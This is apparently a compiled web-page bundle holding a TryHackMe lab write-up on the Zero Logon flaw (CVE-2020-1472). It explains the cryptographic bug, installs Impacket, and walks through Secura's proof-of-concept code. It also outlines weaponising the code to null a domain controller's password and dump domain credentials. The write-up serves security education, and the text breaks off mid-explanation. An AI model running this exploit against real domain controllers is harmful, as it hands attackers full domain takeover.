"use strict";(self.webpackChunkcyfun_me=self.webpackChunkcyfun_me||[]).push([[4355],{3905:(e,t,n)=>{n.d(t,{Zo:()=>p,kt:()=>m});var a=n(67294);function o(e,t,n){return t in e?Object.defineProperty(e,t,{value:n,enumerable:!0,configurable:!0,writable:!0}):e[t]=n,e}function r(e,t){var n=Object.keys(e);if(Object.getOwnPropertySymbols){var a=Object.getOwnPropertySymbols(e);t&&(a=a.filter((function(t){return Object.getOwnPropertyDescriptor(e,t).enumerable}))),n.push.apply(n,a)}return n}function i(e){for(var t=1;t<arguments.length;t++){var n=null!=arguments[t]?arguments[t]:{};t%2?r(Object(n),!0).forEach((function(t){o(e,t,n[t])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(n)):r(Object(n)).forEach((function(t){Object.defineProperty(e,t,Object.getOwnPropertyDescriptor(n,t))}))}return e}function l(e,t){if(null==e)return{};var n,a,o=function(e,t){if(null==e)return{};var n,a,o={},r=Object.keys(e);for(a=0;a<r.length;a++)n=r[a],t.indexOf(n)>=0||(o[n]=e[n]);return o}(e,t);if(Object.getOwnPropertySymbols){var r=Object.getOwnPropertySymbols(e);for(a=0;a<r.length;a++)n=r[a],t.indexOf(n)>=0||Object.prototype.propertyIsEnumerable.call(e,n)&&(o[n]=e[n])}return o}var s=a.createContext({}),c=function(e){var t=a.useContext(s),n=t;return e&&(n="function"==typeof e?e(t):i(i({},t),e)),n},p=function(e){var t=c(e.components);return a.createElement(s.Provider,{value:t},e.children)},h="mdxType",d={inlineCode:"code",wrapper:function(e){var t=e.children;return a.createElement(a.Fragment,{},t)}},u=a.forwardRef((function(e,t){var n=e.components,o=e.mdxType,r=e.originalType,s=e.parentName,p=l(e,["components","mdxType","originalType","parentName"]),h=c(n),u=o,m=h["".concat(s,".").concat(u)]||h[u]||d[u]||r;return n?a.createElement(m,i(i({ref:t},p),{},{components:n})):a.createElement(m,i({ref:t},p))}));function m(e,t){var n=arguments,o=t&&t.mdxType;if("string"==typeof e||o){var r=n.length,i=new Array(r);i[0]=u;var l={};for(var s in t)hasOwnProperty.call(t,s)&&(l[s]=t[s]);l.originalType=e,l[h]="string"==typeof e?e:o,i[1]=l;for(var c=2;c<r;c++)i[c]=n[c];return a.createElement.apply(null,i)}return a.createElement.apply(null,n)}u.displayName="MDXCreateElement"},98431:(e,t,n)=>{n.r(t),n.d(t,{assets:()=>s,contentTitle:()=>i,default:()=>d,frontMatter:()=>r,metadata:()=>l,toc:()=>c});var a=n(87462),o=(n(67294),n(3905));const r={},i="Zero Logon",l={unversionedId:"Tryhackme/Zero Logon/Zero Logon",id:"Tryhackme/Zero Logon/Zero Logon",title:"Zero Logon",description:"Learn about and exploit the ZeroLogon vulnerability that allows an attacker to go from Zero to Domain Admin without any valid credentials.",source:"@site/writeups/Tryhackme/Zero Logon/Zero Logon.md",sourceDirName:"Tryhackme/Zero Logon",slug:"/Tryhackme/Zero Logon/",permalink:"/writeups/Tryhackme/Zero Logon/",draft:!1,tags:[],version:"current",frontMatter:{},sidebar:"tutorialSidebar",previous:{title:"Year of the Rabbit",permalink:"/writeups/Tryhackme/Year of the Rabbit/"}},s={},c=[{value:"\ud83d\udca2 We will cover  the topics",id:"-we-will-cover--the-topics",level:2},{value:"Task 1 The Zero Day Angle",id:"task-1-the-zero-day-angle",level:2},{value:"Task 2 Impacket Installation",id:"task-2-impacket-installation",level:2},{value:"Task 3 The Proof of Concept",id:"task-3-the-proof-of-concept",level:2},{value:"Task 4 Lab It Up!",id:"task-4-lab-it-up",level:2}],p={toc:c},h="wrapper";function d(e){let{components:t,...n}=e;return(0,o.kt)(h,(0,a.Z)({},p,n,{components:t,mdxType:"MDXLayout"}),(0,o.kt)("h1",{id:"zero-logon"},"Zero Logon"),(0,o.kt)("p",null,"Learn about and exploit the ZeroLogon vulnerability that allows an attacker to go from Zero to Domain Admin without any valid credentials."),(0,o.kt)("p",null,(0,o.kt)("a",{parentName:"p",href:"https://tryhackme.com/room/zer0logon"},"Zero Logon")),(0,o.kt)("h2",{id:"-we-will-cover--the-topics"},"\ud83d\udca2 We will cover  the topics"),(0,o.kt)("ul",null,(0,o.kt)("li",{parentName:"ul"},"Zero Logon")),(0,o.kt)("hr",null),(0,o.kt)("h2",{id:"task-1-the-zero-day-angle"},"Task 1 The Zero Day Angle"),(0,o.kt)("p",null,'The purpose of this room is to shed light on the ZeroLogon vulnerability within an educational focus. This is done such that defenders can better understand the threat faced herein. The ZeroLogon vulnerability is approached from a "Proof of Concept" emphasis, providing a breakdown of the vulnerable method within this issue. TryHackMe does not condone illegal actions taken on the part of the individual.'),(0,o.kt)("p",null,(0,o.kt)("strong",{parentName:"p"},"Zero Logon - The Zero Day Angle")),(0,o.kt)("p",null,(0,o.kt)("strong",{parentName:"p"},"About The vulnerability -")),(0,o.kt)("p",null,"On September 14, Secura released a whitepaper for CVE-2020-1472, that allowed an attacker to go from Zero to Domain Admin in approximately one minute. They dubbed this vulnerability Zero Logon."),(0,o.kt)("p",null,"Zero Logon is a purely statistics based attack that abuses a feature within MS-NRPC (Microsoft NetLogon Remote Protocol), MS-NRPC is a critical authentication component of Active Directory that handles authentication for User and Machine accounts. In short -- the attack mainly focuses on a poor implementation of Cryptography. To be more specific, Microsoft chose to use AES-CFB8 for a function called ComputeNetlogonCredential, which is normally fine, except they had hard coded the Initialization Vector to use all zeros instead of a random string. When an attacker sends a message only containing zeros with the IV of zero, there is a 1-in-256 chance that the Ciphertext will be Zero."),(0,o.kt)("p",null,"But how is that useful to us? We'll touch on that note in the following sections."),(0,o.kt)("p",null,(0,o.kt)("strong",{parentName:"p"},"About Machine Accounts -")),(0,o.kt)("p",null,"Normally, if we tried a statistics based attack on any user account, we would get locked out. This is not the case if we apply this principal to machine accounts. Machines accounts behave in a much different way than standard user accounts. They have no predefined account lockout attempts because a 64+ character alpha numeric password is normally used to secure them, making them very difficult to break into. They're not meant to be accessed by an end user by any means. In certain circumstances, we can dump the machine account password using a tool like Mimikatz, but if we're at that point, we've already compromised the machine -- and we're looking for persistence within the domain, not lateral movement."),(0,o.kt)("p",null,(0,o.kt)("strong",{parentName:"p"},"Abusing the Vulnerability -")),(0,o.kt)("p",null,"Machine accounts often hold system level privileges which we can use for a variety of things. If you're not familiar with Active Directory, we can take the Domain Controller's Machine Account and attempt to use the granted authentication in conjunction with Secretsdump.py (SecretsDump is a password dumping utility like Mimikatz, except it lives on the Network instead of the host) to dump all of the passwords within the domain. At this point we have a rough kill chain starting to form:"),(0,o.kt)("p",null,"Use Zero Logon to bypass authentication on the Domain Controller's Machine Account -> Run Secretsdump.py to dump credentials -> Crack/Pass Domain Admin Hashes -> ??? -> Profit"),(0,o.kt)("p",null,(0,o.kt)("strong",{parentName:"p"},"Analyzing the MS-NRPC Logon Process -")),(0,o.kt)("p",null,"At this point, we know a vulnerability exists, but we're not quite sure how to exploit it yet. We'll be covering that soon, but what we do know there's a vulnerability within the way Microsoft handles Authentication within ComputeNetLogonCredetial function of MS-NRPC. To better understand the vulnerability, we need to do a bit of a deeper dive on how Microsoft handles authentication to NRPC."),(0,o.kt)("p",null,"To analyze where the vulnerability occurs, we'll be using the Diagram provided by Secura as well as Microsoft Documentation to decipher the magic behind Zero Logon. The sources can be found at the bottom of this task."),(0,o.kt)("p",null,(0,o.kt)("img",{parentName:"p",src:"https://zdnet4.cbsistatic.com/hub/i/r/2020/09/11/91ce3485-5a9b-4fd7-9bdb-908084954c58/resize/1200xauto/fe9d0bc8d73a637a58da4d40978ede5d/zerologon-attack.png",alt:null})),(0,o.kt)("p",null,"Source: Secura"),(0,o.kt)("p",null,(0,o.kt)("strong",{parentName:"p"},"Step 1"),". The client creates a NetrServerReqChallenge and sends it off ","[Figure 1. Step 1]",". This contains the following values:"),(0,o.kt)("ol",null,(0,o.kt)("li",{parentName:"ol"},"The DC"),(0,o.kt)("li",{parentName:"ol"},"The Target Device (Also the DC, in our case)"),(0,o.kt)("li",{parentName:"ol"},"A Nonce (In our case is 16 Bytes of Zero).")),(0,o.kt)("p",null,(0,o.kt)("strong",{parentName:"p"},"Step 2"),". The server receives the NetrServerReqChallenge, the server will then generate it's own Nonce (This is called the Server Challenge), the server will send the Server Challenge back. ","[Figure 1. Step 2]"),(0,o.kt)("p",null,(0,o.kt)("strong",{parentName:"p"},"Step 3"),". The client (us) will compute it's NetLogon Credentials with the Server Challenge provided ","[Figure 1. Step 3]",". It uses the NetrServerAuthenticate3 method which requires the following parameters:"),(0,o.kt)("ol",null,(0,o.kt)("li",{parentName:"ol"},"A Custom Binding Handle (Impacket handles this for us, it's negotiated prior)"),(0,o.kt)("li",{parentName:"ol"},"An Account Name (The Domain Controller's machine account name. ex: DC01$)"),(0,o.kt)("li",{parentName:"ol"},"A Secure Channel Type (Impacket sort of handles this for us, but we still need to specify it: ","[nrpc.NETLOGON_SECURE_CHANNEL_TYPE.ServerSecureChannel]",")"),(0,o.kt)("li",{parentName:"ol"},"The Computer Name (The Domain Controller ex: DC01)"),(0,o.kt)("li",{parentName:"ol"},"The Client Credential String (this will be 8 hextets of \\x00 ","[16 Bytes of Zero]",")"),(0,o.kt)("li",{parentName:"ol"},"Negotiation Flags (The following value observed from a Win10 client with Sign/Seal flags disabled: 0x212fffff Provided by Secura)")),(0,o.kt)("p",null,(0,o.kt)("strong",{parentName:"p"},"Step 4"),". The server will receive the NetrServerAuthenticate request and will compute the same request itself using it's known, good values. If the results are good, the server will send the required info back to the client. ","[Figure 1. Step 4.]"),(0,o.kt)("p",null,"At this point the attempt to exploit the Zero Logon vulnerability is under way. The above steps above will be looped through a certain number of times to attempt to exploit the Zero Logon vulnerability. The actual exploit occurs at Step 3 and 4, this where we're hoping for the Server to a have the same computations as the client. This is where are 1-in-256 chance comes in."),(0,o.kt)("p",null,(0,o.kt)("strong",{parentName:"p"},"Step 5"),". If the server calculates the same value, the client will re-verify and once mutual agreement is confirmed, they will agree on a session key. The session key will be used to encrypt communications between the client and the server, which means authentication is successful. ","[Figure 1. Step 5]"),(0,o.kt)("p",null,"From there, normal RPC communications can occur."),(0,o.kt)("p",null,"Sources -"),(0,o.kt)("ol",null,(0,o.kt)("li",{parentName:"ol"},(0,o.kt)("p",{parentName:"li"},"Tom Tervoort of Secura - ",(0,o.kt)("a",{parentName:"p",href:"https://www.secura.com/pathtoimg.php?id=2055"},"https://www.secura.com/pathtoimg.php?id=2055"))),(0,o.kt)("li",{parentName:"ol"},(0,o.kt)("p",{parentName:"li"},"Microsoft - ",(0,o.kt)("a",{parentName:"p",href:"https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-nrpc/7b9e31d1-670e-4fc5-ad54-9ffff50755f9"},"https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-nrpc/7b9e31d1-670e-4fc5-ad54-9ffff50755f9"))),(0,o.kt)("li",{parentName:"ol"},(0,o.kt)("p",{parentName:"li"},"Microsoft - ",(0,o.kt)("a",{parentName:"p",href:"https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-nrpc/3a9ed16f-8014-45ae-80af-c0ecb06e2db9"},"https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-nrpc/3a9ed16f-8014-45ae-80af-c0ecb06e2db9"))),(0,o.kt)("li",{parentName:"ol"},(0,o.kt)("p",{parentName:"li"},"Read about Zero Logon"))),(0,o.kt)("h2",{id:"task-2-impacket-installation"},"Task 2 Impacket Installation"),(0,o.kt)("p",null,(0,o.kt)("strong",{parentName:"p"},"Impacket Installation")),(0,o.kt)("p",null,(0,o.kt)("strong",{parentName:"p"},"Git Clone Impacket -")),(0,o.kt)("p",null,"As a prior warning, Impacket can be quite fussy when it comes to some modules within nrpc.py, because of this, we recommend using the TryHackMe Attack Box. This will make the exploit run faster, additionally, we can attempt to provide better support via the Attack Box. Additionally, we are going to be using a Virtual Environment to Install Impacket. The instructions to install Impacket are as follows:"),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"python3 -m pip install virtualenv\n\npython3 -m virtualenv impacketEnv\n\nsource impacketEnv/bin/activate\n\npip install git+https://github.com/SecureAuthCorp/impacket\n")),(0,o.kt)("p",null,"After executing these commands, you should be placed within a Python3 Virtual Environment that will be compatible to modify the PoC to exploit Zero Logon."),(0,o.kt)("p",null,"Credit to Onurshin in the ",(0,o.kt)("a",{parentName:"p",href:"https://discord.com/invite/tryhackme"},"TryHackMe Discord")," for suggesting Python Virtual Environments."),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"kali@kali:~/CTFs/tryhackme/Zero Logon$ python3 -m pip install virtualenv\nDefaulting to user installation because normal site-packages is not writeable\nCollecting virtualenv\n  Downloading virtualenv-20.1.0-py2.py3-none-any.whl (4.9 MB)\n     |\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588| 4.9 MB 2.6 MB/s\nCollecting filelock<4,>=3.0.0\n  Downloading filelock-3.0.12-py3-none-any.whl (7.6 kB)\nRequirement already satisfied: six<2,>=1.9.0 in /usr/lib/python3/dist-packages (from virtualenv) (1.14.0)\nCollecting distlib<1,>=0.3.1\n  Downloading distlib-0.3.1-py2.py3-none-any.whl (335 kB)\n     |\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588| 335 kB 11.6 MB/s\nCollecting appdirs<2,>=1.4.3\n  Downloading appdirs-1.4.4-py2.py3-none-any.whl (9.6 kB)\nInstalling collected packages: filelock, distlib, appdirs, virtualenv\nSuccessfully installed appdirs-1.4.4 distlib-0.3.1 filelock-3.0.12 virtualenv-20.1.0\n")),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"kali@kali:~/CTFs/tryhackme/Zero Logon$ python3 -m virtualenv impacketEnv\ncreated virtual environment CPython3.8.2.final.0-64 in 2312ms\n  creator CPython3Posix(dest=/home/kali/CTFs/tryhackme/Zero Logon/impacketEnv, clear=False, global=False)\n  seeder FromAppData(download=False, pip=bundle, setuptools=bundle, wheel=bundle, via=copy, app_data_dir=/home/kali/.local/share/virtualenv)\n    added seed packages: pip==20.2.4, setuptools==50.3.2, wheel==0.35.1\n  activators BashActivator,CShellActivator,FishActivator,PowerShellActivator,PythonActivator,XonshActivator\n")),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"kali@kali:~/CTFs/tryhackme/Zero Logon$ source impacketEnv/bin/activate\n(impacketEnv) kali@kali:~/CTFs/tryhackme/Zero Logon$ pip install git+https://github.com/SecureAuthCorp/impacket\nCollecting git+https://github.com/SecureAuthCorp/impacket\n  Cloning https://github.com/SecureAuthCorp/impacket to /tmp/pip-req-build-8uoutbyk\nCollecting pyasn1>=0.2.3\n  Using cached pyasn1-0.4.8-py2.py3-none-any.whl (77 kB)\nCollecting pycryptodomex\n  Downloading pycryptodomex-3.9.8-cp38-cp38-manylinux1_x86_64.whl (13.7 MB)\n     |\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588| 13.7 MB 10.2 MB/s\nCollecting pyOpenSSL>=0.13.1\n  Downloading pyOpenSSL-19.1.0-py2.py3-none-any.whl (53 kB)\n     |\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588| 53 kB 2.6 MB/s\nCollecting six\n  Using cached six-1.15.0-py2.py3-none-any.whl (10 kB)\nCollecting ldap3!=2.5.0,!=2.5.2,!=2.6,>=2.5\n  Downloading ldap3-2.8.1-py2.py3-none-any.whl (423 kB)\n     |\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588| 423 kB 11.9 MB/s\nCollecting ldapdomaindump>=0.9.0\n  Downloading ldapdomaindump-0.9.3-py3-none-any.whl (18 kB)\nCollecting flask>=1.0\n  Downloading Flask-1.1.2-py2.py3-none-any.whl (94 kB)\n     |\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588| 94 kB 2.7 MB/s\nCollecting cryptography>=2.8\n  Downloading cryptography-3.2.1-cp35-abi3-manylinux2010_x86_64.whl (2.6 MB)\n     |\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588| 2.6 MB 10.1 MB/s\nCollecting dnspython\n  Downloading dnspython-2.0.0-py3-none-any.whl (208 kB)\n     |\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588| 208 kB 5.9 MB/s\nCollecting future\n  Downloading future-0.18.2.tar.gz (829 kB)\n     |\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588| 829 kB 9.5 MB/s\nCollecting itsdangerous>=0.24\n  Downloading itsdangerous-1.1.0-py2.py3-none-any.whl (16 kB)\nCollecting click>=5.1\n  Using cached click-7.1.2-py2.py3-none-any.whl (82 kB)\nCollecting Jinja2>=2.10.1\n  Downloading Jinja2-2.11.2-py2.py3-none-any.whl (125 kB)\n     |\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588| 125 kB 11.0 MB/s\nCollecting Werkzeug>=0.15\n  Downloading Werkzeug-1.0.1-py2.py3-none-any.whl (298 kB)\n     |\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588| 298 kB 8.6 MB/s\nCollecting cffi!=1.11.3,>=1.8\n  Downloading cffi-1.14.3-cp38-cp38-manylinux1_x86_64.whl (410 kB)\n     |\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588| 410 kB 10.9 MB/s\nCollecting MarkupSafe>=0.23\n  Downloading MarkupSafe-1.1.1-cp38-cp38-manylinux1_x86_64.whl (32 kB)\nCollecting pycparser\n  Using cached pycparser-2.20-py2.py3-none-any.whl (112 kB)\nBuilding wheels for collected packages: impacket, future\n  Building wheel for impacket (setup.py) ... done\n  Created wheel for impacket: filename=impacket-0.9.22.dev1+20201015.130615.81eec85a-py3-none-any.whl size=1380825 sha256=4814945cbf35d81d3e80607e2914cee9750afeb4757293fdbfcc6c3d27d4a096\n  Stored in directory: /tmp/pip-ephem-wheel-cache-yfasbqvb/wheels/f2/97/f5/f481ead2e27c873c98fbbcb0074319ce69f16008f64caea6fe\n  Building wheel for future (setup.py) ... done\n  Created wheel for future: filename=future-0.18.2-py3-none-any.whl size=491059 sha256=f2a6c932900add817af8ec4134b22ed70d70f6166b8a109188e079e53986272b\n  Stored in directory: /home/kali/.cache/pip/wheels/8e/70/28/3d6ccd6e315f65f245da085482a2e1c7d14b90b30f239e2cf4\nSuccessfully built impacket future\nInstalling collected packages: pyasn1, pycryptodomex, six, pycparser, cffi, cryptography, pyOpenSSL, ldap3, dnspython, future, ldapdomaindump, itsdangerous, click, MarkupSafe, Jinja2, Werkzeug, flask, impacket\nSuccessfully installed Jinja2-2.11.2 MarkupSafe-1.1.1 Werkzeug-1.0.1 cffi-1.14.3 click-7.1.2 cryptography-3.2.1 dnspython-2.0.0 flask-1.1.2 future-0.18.2 impacket-0.9.22.dev1+20201015.130615.81eec85a itsdangerous-1.1.0 ldap3-2.8.1 ldapdomaindump-0.9.3 pyOpenSSL-19.1.0 pyasn1-0.4.8 pycparser-2.20 pycryptodomex-3.9.8 six-1.15.0\n")),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"(impacketEnv) kali@kali:~/CTFs/tryhackme/Zero Logon$\n")),(0,o.kt)("ol",null,(0,o.kt)("li",{parentName:"ol"},"Install Impacket in a Virtual Environment")),(0,o.kt)("p",null,(0,o.kt)("inlineCode",{parentName:"p"},"No answer needed")),(0,o.kt)("h2",{id:"task-3-the-proof-of-concept"},"Task 3 The Proof of Concept"),(0,o.kt)("p",null,(0,o.kt)("strong",{parentName:"p"},"Modifying and Weaponizing the PoC")),(0,o.kt)("p",null,(0,o.kt)("strong",{parentName:"p"},"PoC and You -")),(0,o.kt)("p",null,"Poof of Concepts are incredibly important to every exploit, without them, the exploit's are almost entirely theoretical. Fortunately, Secura was able to provide a working ",(0,o.kt)("a",{parentName:"p",href:"https://github.com/SecuraBV/CVE-2020-1472"},"Proof of Concept for Zero Logon")," that was 90% of the way there. We simply need to make an additional call to change the password to a null value, recall Figure 3 from Task 2, Secura was even kind enough to give us the method that we need to call (",(0,o.kt)("a",{parentName:"p",href:"https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-nrpc/14b020a8-0bcf-4af5-ab72-cc92bc6b1d81"},"NetrServerPasswordSet2"),"). Looking up the method within the Microsoft Documentation, it's very similar to ",(0,o.kt)("a",{parentName:"p",href:"https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-nrpc/3a9ed16f-8014-45ae-80af-c0ecb06e2db9"},"hNetSeverAuthenticate3"),", so we're going to re-use some of the same variables from that, as well as the structure."),(0,o.kt)("p",null,(0,o.kt)("strong",{parentName:"p"},"Analyzing the PoC -")),(0,o.kt)("p",null,"Before we continue any further, you should download the PoC from Secura, which can be found here:"),(0,o.kt)("p",null,(0,o.kt)("a",{parentName:"p",href:"https://raw.githubusercontent.com/SecuraBV/CVE-2020-1472/master/zerologon_tester.py"},"https://raw.githubusercontent.com/SecuraBV/CVE-2020-1472/master/zerologon_tester.py")),(0,o.kt)("p",null,"The script may seem quite daunting at first, but it's quite simple, if you think back to Figure 1 from Task 2, you'll quickly see how it all starts to fit together. Let's start by breaking the PoC down. We're going to be this in order of execution/importance so it's easier to digest:"),(0,o.kt)("p",null,(0,o.kt)("strong",{parentName:"p"},"Lines 3 - 13")),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre",className:"language-py"},"from impacket.dcerpc.v5 import nrpc, epm\nfrom impacket.dcerpc.v5.dtypes import NULL\nfrom impacket.dcerpc.v5 import transport\nfrom impacket import crypto\n\nimport hmac, hashlib, struct, sys, socket, time\nfrom binascii import hexlify, unhexlify\nfrom subprocess import check_call\nMAX_ATTEMPTS = 2000\n")),(0,o.kt)("p",null,"Lines 1-4 import the required modules from Impacket, specifically the NRPC, EPM, Crypto, and Transport libraries. Additionally, on lines 6-8 a handful of other misc libraries are also imported, however, the Impacket libraries are the star of the show here. Lastly, on line 9, we're defining a constant (similar to a variable, but never changes) that sets the maximum number of retries for Zero Logon to 2000."),(0,o.kt)("p",null,(0,o.kt)("strong",{parentName:"p"},"Lines 76 - 86")),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre",className:"language-py"},"if __name__ == '__main__':\n    if not (3 <= len(sys.argv) <= 4):\n    print('Usage: zerologon_tester.py <dc-name> <dc-ip>\\n')\n    print('Tests whether a domain controller is vulnerable to the Zerologon attack. Does not attempt to make any changes.')\n    print('Note: dc-name should be the (NetBIOS) computer name of the domain controller.')\n    sys.exit(1)\n    else:\n    [_, dc_name, dc_ip] = sys.argv\n\n    dc_name = dc_name.rstrip('$')\n    perform_attack('\\\\\\\\' + dc_name, dc_ip, dc_name)\n")),(0,o.kt)("p",null,"Next we skipped down to the very bottom of the script so some other variables will make sense later, Line 1 is essentially declaring a main function within Python, Line 2 we are checking for the amount of parameters, and ensuring that it's exactly 3 (zerologon_tester.py DCNAME IP). Lines 3-5 are printing the help menu only if it's greater than 3 arguments, or less than 2 and exiting. If the required arguments are supplied, on line 8 the arguments are being passed into two variables: dc_name, and dc_ip. After the arguments are passed, dc_name is being stripped of the \"$\" character, as the dc_name variable shouldn't have it. The user account name should however. Afterwards, it's passing the variables two variables and an additional, modified variable into a module called \"perform_attack\"."),(0,o.kt)("p",null,(0,o.kt)("strong",{parentName:"p"},"Lines 57 - 73")),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre",className:"language-py"},"def perform_attack(dc_handle, dc_ip, target_computer):\n\n    print('Performing authentication attempts...')\n    rpc_con = None\n    for attempt in range(0, MAX_ATTEMPTS):\n    rpc_con = try_zero_authenticate(dc_handle, dc_ip, target_computer)\n\n    if rpc_con == None:\n        print('=', end='', flush=True)\n    else:\n        break\n\n    if rpc_con:\n    print('\\nSuccess! DC can be fully compromised by a Zerologon attack.')\n    else:\n    print('\\nAttack failed. Target is probably patched.')\n    sys.exit(1)\n")),(0,o.kt)("p",null,"Line 1 is defining where the variables are being passed into for the local function, ","\\","DCNAME is being passed into the dc_handle variable, dc_ip is being passed into dc_ip variable, and dc_name is being passed into the target_computer variable. All of which will be used later, or passed into different modules."),(0,o.kt)("p",null,'Line 4 sets the variable rpc_con equal to none, this will be kept track of consistently to check and see if authentication is successful, if it\'s not, the script will continue until 2000 retries is hit. Line 5 is where the actual retries for Zero Logon occurs in the form of a for loop. Line 6 sets the rpc_con variable to the output of a different function called "try_zero_authenticate" with a couple of variables being passed to it, specifically dc_handle, dc_ip, and target_computer. All of which we addressed earlier. The next lines are simply checking if rpc_con is equal to a invalid login attempt, if it is, print =, if not, print success, if 2000 retries is hit: print attack failed.'),(0,o.kt)("p",null,(0,o.kt)("strong",{parentName:"p"},"Lines 20-25")),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre",className:"language-py"},"def try_zero_authenticate(dc_handle, dc_ip, target_computer):\n\n    binding = epm.hept_map(dc_ip, nrpc.MSRPC_UUID_NRPC, protocol='ncacn_ip_tcp')\n    rpc_con = transport.DCERPCTransportFactory(binding).get_dce_rpc()\n    rpc_con.connect()\n    rpc_con.bind(nrpc.MSRPC_UUID_NRPC)\n")),(0,o.kt)("p",null,"Line 1 is defining the try_zero_authenticate function and is taking the previously mentioned 3 variables as input, and is passing them into the function. Lines 3-6 are establishing a bind and a session with NRPC over TCP/IP so that we can communicate with the domain controller."),(0,o.kt)("p",null,(0,o.kt)("strong",{parentName:"p"},"Lines 27-40")),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre",className:"language-py"},"plaintext = b'\\x00' * 8\nciphertext = b'\\x00' * 8\n\nflags = 0x212fffff\n\nnrpc.hNetrServerReqChallenge(rpc_con, dc_handle + '\\x00', target_computer + '\\x00', plaintext)\ntry:\nserver_auth = nrpc.hNetrServerAuthenticate3(rpc_con, dc_handle + '\\x00', target_computer + '$\\x00', nrpc.NETLOGON_SECURE_CHANNEL_TYPE.ServerSecureChannel,target_computer + '\\x00', ciphertext, flags)\n")),(0,o.kt)("p",null,'Line 1 and 2 are establishing two new variables, plaintext and ciphertext containing 16 Bytes of "\\x00" which will be used to exploit the Zero Logon vulnerability. Line 4 contains a variable called Flags. These are the default flags observed from a Windows 10 Client (using AES-CFB8) with the Sign and Seal bit disabled (Source/Credit: Secura).'),(0,o.kt)("p",null,"Line 6 is where the fun beings -- This is where Step 1 beings in Figure 1, the client creates a NetrServerReqChallenge containing the following information required by the ",(0,o.kt)("a",{parentName:"p",href:"https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-nrpc/5ad9db9f-7441-4ce5-8c7b-7b771e243d32"},"Microsoft Documentation"),":"),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre",className:"language-py"},"NTSTATUS NetrServerReqChallenge(\n    [in, unique, string] LOGONSRV_HANDLE PrimaryName,\n    [in, string] wchar_t* ComputerName,\n    [in] PNETLOGON_CREDENTIAL ClientChallenge,\n);\n")),(0,o.kt)("p",null,'The Primary Name being the DC Handle, the Computer Name being the Target Computer, and the Client Challenge being 16 bytes of "\\x00".'),(0,o.kt)("p",null,"And the client will receive back, which will be used in Figure 1, Step 2:"),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre",className:"language-py"},"NTSTATUS NetrServerReqChallenge(\n    [out] PNETLOGON_CREDENTIAL ServerChallenge\n);\n")),(0,o.kt)("p",null,"Lines 8 sets up a try except (we'll see the rest of that in the next few lines), but in line 9 is where we actually attempt to exploit the Zero Logon vulnerability, this would be Figure 1, Step 3. This section requires a fair bit more information, per the Microsoft Documentation for NetrServerAuthenticate3, the following is 